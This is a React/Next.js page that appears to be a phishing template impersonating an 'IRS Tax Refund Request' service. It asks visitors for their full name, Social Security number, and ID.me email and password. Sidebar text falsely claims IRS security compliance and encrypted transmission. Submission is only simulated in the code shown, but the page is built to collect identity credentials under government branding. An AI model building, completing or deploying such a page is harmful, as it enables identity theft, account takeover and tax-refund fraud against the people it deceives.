"use client"

import type React from "react"

import { DashboardLayout } from "@/components/dashboard/dashboard-layout"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { AlertTriangle, FileText, Shield, User } from "lucide-react"
import { useState } from "react"

const countries = [
  "Afghanistan",
  "Albania",
  "Algeria",
  "American Samoa",
  "Andorra",
  "Angola",
  "Anguilla",
  "Antarctica",
  "Antigua and Barbuda",
  "Argentina",
  "Armenia",
  "Aruba",
  "Australia",
  "Austria",
  "Azerbaijan",
  "Bahamas",
  "Bahrain",
  "Bangladesh",
  "Barbados",
  "Belarus",
  "Belgium",
  "Belize",
  "Benin",
  "Bermuda",
  "Bhutan",
  "Bolivia",
  "Bosnia and Herzegovina",
  "Botswana",
  "Bouvet Island",
  "Brazil",
  "British Indian Ocean Territory",
  "Brunei Darussalam",
  "Bulgaria",
  "Burkina Faso",
  "Burundi",
  "Cambodia",
  "Cameroon",
  "Canada",
  "Cape Verde",
  "Cayman Islands",
  "Central African Republic",
  "Chad",
  "Chile",
  "China",
  "Christmas Island",
  "Cocos (Keeling) Islands",
  "Colombia",
  "Comoros",
  "Congo",
  "Cook Islands",
  "Costa Rica",
  "Croatia (Hrvatska)",
  "Cuba",
  "Cyprus",
  "Czech Republic",
  "Denmark",
  "Djibouti",
  "Dominica",
  "Dominican Republic",
  "East Timor",
  "Ecuador",
  "Egypt",
  "El Salvador",
  "Equatorial Guinea",
  "Eritrea",
  "Estonia",
  "Ethiopia",
  "Falkland Islands (Malvinas)",
  "Faroe Islands",
  "Fiji",
  "Finland",
  "France",
  "France, Metropolitan",
  "French Guiana",
  "French Polynesia",
  "French Southern Territories",
  "Gabon",
  "Gambia",
  "Georgia",
  "Germany",
  "Ghana",
  "Gibraltar",
  "Guernsey",
  "Greece",
  "Greenland",
  "Grenada",
  "Guadeloupe",
  "Guam",
  "Guatemala",
  "Guinea",
  "Guinea-Bissau",
  "Guyana",
  "Haiti",
  "Heard and Mc Donald Islands",
  "Honduras",
  "Hong Kong",
  "Hungary",
  "Iceland",
  "India",
  "Isle of Man",
  "Indonesia",
  "Iran (Islamic Republic of)",
  "Iraq",
  "Ireland",
  "Israel",
  "Italy",
  "Ivory Coast",
  "Jersey",
  "Jamaica",
  "Japan",
  "Jordan",
  "Kazakhstan",
  "Kenya",
  "Kiribati",
  "Korea, Democratic People's Republic of",
  "Korea, Republic of",
  "Kosovo",
  "Kuwait",
  "Kyrgyzstan",
  "Lao People's Democratic Republic",
  "Latvia",
  "Lebanon",
  "Lesotho",
  "Liberia",
  "Libyan Arab Jamahiriya",
  "Liechtenstein",
  "Lithuania",
  "Luxembourg",
  "Macau",
  "Macedonia",
  "Madagascar",
  "Malawi",
  "Malaysia",
  "Maldives",
  "Mali",
  "Malta",
  "Marshall Islands",
  "Martinique",
  "Mauritania",
  "Mauritius",
  "Mayotte",
  "Mexico",
  "Micronesia, Federated States of",
  "Moldova, Republic of",
  "Monaco",
  "Mongolia",
  "Montenegro",
  "Montserrat",
  "Morocco",
  "Mozambique",
  "Myanmar",
  "Namibia",
  "Nauru",
  "Nepal",
  "Netherlands",
  "Netherlands Antilles",
  "New Caledonia",
  "New Zealand",
  "Nicaragua",
  "Niger",
  "Nigeria",
  "Niue",
  "Norfolk Island",
  "Northern Mariana Islands",
  "Norway",
  "Oman",
  "Pakistan",
  "Palau",
  "Palestine",
  "Panama",
  "Papua New Guinea",
  "Paraguay",
  "Peru",
  "Philippines",
  "Pitcairn",
  "Poland",
  "Portugal",
  "Puerto Rico",
  "Qatar",
  "Reunion",
  "Romania",
  "Russian Federation",
  "Rwanda",
  "Saint Kitts and Nevis",
  "Saint Lucia",
  "Saint Vincent and the Grenadines",
  "Samoa",
  "San Marino",
  "Sao Tome and Principe",
  "Saudi Arabia",
  "Senegal",
  "Serbia",
  "Seychelles",
  "Sierra Leone",
  "Singapore",
  "Slovakia",
  "Slovenia",
  "Solomon Islands",
  "Somalia",
  "South Africa",
  "South Georgia South Sandwich Islands",
  "South Sudan",
  "Spain",
  "Sri Lanka",
  "St. Helena",
  "St. Pierre and Miquelon",
  "Sudan",
  "Suriname",
  "Svalbard and Jan Mayen Islands",
  "Swaziland",
  "Sweden",
  "Switzerland",
  "Syrian Arab Republic",
  "Taiwan",
  "Tajikistan",
  "Tanzania, United Republic of",
  "Thailand",
  "Togo",
  "Tokelau",
  "Tonga",
  "Trinidad and Tobago",
  "Tunisia",
  "Turkey",
  "Turkmenistan",
  "Turks and Caicos Islands",
  "Tuvalu",
  "Uganda",
  "Ukraine",
  "United Arab Emirates",
  "United Kingdom",
  "United States",
  "United States minor outlying islands",
  "Uruguay",
  "Uzbekistan",
  "Vanuatu",
  "Vatican City State",
  "Venezuela",
  "Vietnam",
  "Virgin Islands (British)",
  "Virgin Islands (U.S.)",
  "Wallis and Futuna Islands",
  "Western Sahara",
  "Yemen",
  "Zaire",
  "Zambia",
  "Zimbabwe",
]

export default function IRSTaxRefundPage() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [formData, setFormData] = useState({
    fullName: "",
    ssn: "",
    idmeEmail: "",
    idmePassword: "",
    country: "",
  })

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    // Simulate form submission
    await new Promise((resolve) => setTimeout(resolve, 2000))

    alert("Tax refund request submitted successfully!")
    setIsSubmitting(false)
  }

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
  }

  return (
    <DashboardLayout activeItem="irs-tax-refund">
      <div className="space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-bold text-gray-900">IRS Tax Refund Request</h1>
            <p className="text-gray-600 mt-1">Please fill out the form below to submit your IRS tax refund request</p>
          </div>
          <div className="flex items-center space-x-2 text-sm text-gray-500">
            <FileText className="h-4 w-4" />
            <span>Tax Services</span>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Main Form */}
            <div className="lg:col-span-2 space-y-6">
              {/* Personal Information */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <User className="h-5 w-5 text-[#c4d626]" />
                    <span>Personal Information</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="fullName">Full Name *</Label>
                    <Input
                      id="fullName"
                      type="text"
                      value={formData.fullName}
                      onChange={(e) => handleInputChange("fullName", e.target.value)}
                      placeholder="Enter your full legal name"
                      required
                      className="mt-1"
                    />
                  </div>
                  <div>
                    <Label htmlFor="ssn">Social Security Number (SSN) *</Label>
                    <Input
                      id="ssn"
                      type="text"
                      value={formData.ssn}
                      onChange={(e) => handleInputChange("ssn", e.target.value)}
                      placeholder="XXX-XX-XXXX"
                      maxLength={11}
                      required
                      className="mt-1"
                    />
                  </div>
                </CardContent>
              </Card>

              {/* ID.me Credentials */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="h-5 w-5 text-[#c4d626]" />
                    <span>ID.me Credentials</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="idmeEmail">ID.me Email *</Label>
                    <Input
                      id="idmeEmail"
                      type="email"
                      value={formData.idmeEmail}
                      onChange={(e) => handleInputChange("idmeEmail", e.target.value)}
                      placeholder="Enter your ID.me email address"
                      required
                      className="mt-1"
                    />
                  </div>
                  <div>
                    <Label htmlFor="idmePassword">ID.me Password *</Label>
                    <Input
                      id="idmePassword"
                      type="password"
                      value={formData.idmePassword}
                      onChange={(e) => handleInputChange("idmePassword", e.target.value)}
                      placeholder="Enter your ID.me password"
                      required
                      className="mt-1"
                    />
                  </div>
                </CardContent>
              </Card>

              {/* Location Information */}
              <Card>
                <CardHeader>
                  <CardTitle>Location Information</CardTitle>
                </CardHeader>
                <CardContent>
                  <div>
                    <Label htmlFor="country">Country *</Label>
                    <Select
                      value={formData.country}
                      onValueChange={(value) => handleInputChange("country", value)}
                      required
                    >
                      <SelectTrigger className="mt-1">
                        <SelectValue placeholder="Select your country" />
                      </SelectTrigger>
                      <SelectContent>
                        {countries.map((country) => (
                          <SelectItem key={country} value={country}>
                            {country}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </CardContent>
              </Card>

              {/* Submit Button */}
              <div className="flex space-x-4">
                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="bg-[#c4d626] hover:bg-[#b8c423] text-black font-semibold px-8"
                >
                  {isSubmitting ? "Submitting..." : "Submit Request"}
                </Button>
                <Button type="button" variant="outline" onClick={() => window.history.back()}>
                  Back to Dashboard
                </Button>
              </div>
            </div>

            {/* Sidebar */}
            <div className="space-y-6">
              {/* Important Notice */}
              <Card className="border-orange-200 bg-orange-50">
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2 text-orange-800">
                    <AlertTriangle className="h-5 w-5" />
                    <span>Important Notice</span>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-sm text-orange-700">
                    Please ensure all information provided is accurate and matches your ID.me account details. Any
                    discrepancies may result in delays or rejection of your refund request.
                  </p>
                </CardContent>
              </Card>

              {/* Processing Information */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Processing Information</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex items-start space-x-3">
                    <div className="w-2 h-2 bg-[#c4d626] rounded-full mt-2"></div>
                    <div>
                      <p className="font-medium text-sm">Review Process</p>
                      <p className="text-xs text-gray-600">Applications are reviewed within 3-5 business days</p>
                    </div>
                  </div>
                  <div className="flex items-start space-x-3">
                    <div className="w-2 h-2 bg-[#c4d626] rounded-full mt-2"></div>
                    <div>
                      <p className="font-medium text-sm">Verification Required</p>
                      <p className="text-xs text-gray-600">ID.me verification must be completed</p>
                    </div>
                  </div>
                  <div className="flex items-start space-x-3">
                    <div className="w-2 h-2 bg-[#c4d626] rounded-full mt-2"></div>
                    <div>
                      <p className="font-medium text-sm">Refund Timeline</p>
                      <p className="text-xs text-gray-600">Approved refunds processed within 7-14 days</p>
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Security Notice */}
              <Card className="border-green-200 bg-green-50">
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2 text-green-800">
                    <Shield className="h-5 w-5" />
                    <span>Security & Privacy</span>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-sm text-green-700">
                    Your personal information is encrypted and securely transmitted. We comply with all IRS security
                    standards and never store sensitive data on our servers.
                  </p>
                </CardContent>
              </Card>
            </div>
          </div>
        </form>
      </div>
    </DashboardLayout>
  )
}
